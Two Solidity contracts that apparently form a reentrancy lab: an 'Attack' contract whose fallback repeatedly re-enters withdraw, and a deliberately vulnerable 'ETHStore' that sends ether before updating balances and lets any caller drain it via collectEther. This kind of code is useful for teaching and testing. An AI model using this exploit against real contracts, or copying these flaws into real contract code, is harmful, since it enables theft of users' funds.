// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.4.19;
import "./ETHStore.sol";

contract Attack {
    ETHStore public ethStore;
    bool public fun = true;

    function Attack(address _ethStore) {
        ethStore = ETHStore(_ethStore);
    }

    function setFun() public {
        fun = !fun;
    }

    function pwnEthStore() public payable {
        ethStore.deposit.value(msg.value)();
        ethStore.withdraw(1 ether);
    }

    function deposit() public payable {
        ethStore.deposit.value(msg.value)();
    }

    function attack() public payable {
        ethStore.withdraw(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    function() external payable {
        if (address(ethStore).balance >= 1 ether) {
            ethStore.withdraw(1 ether);
        }
    }
}

// SPDX-License-Identifier: GPL-2.0-or-later



pragma solidity 0.4.19;

contract ETHStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        msg.sender.call.value(amount)("");
        balances[msg.sender] -= amount;
    }

    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }

    function() external payable {}
}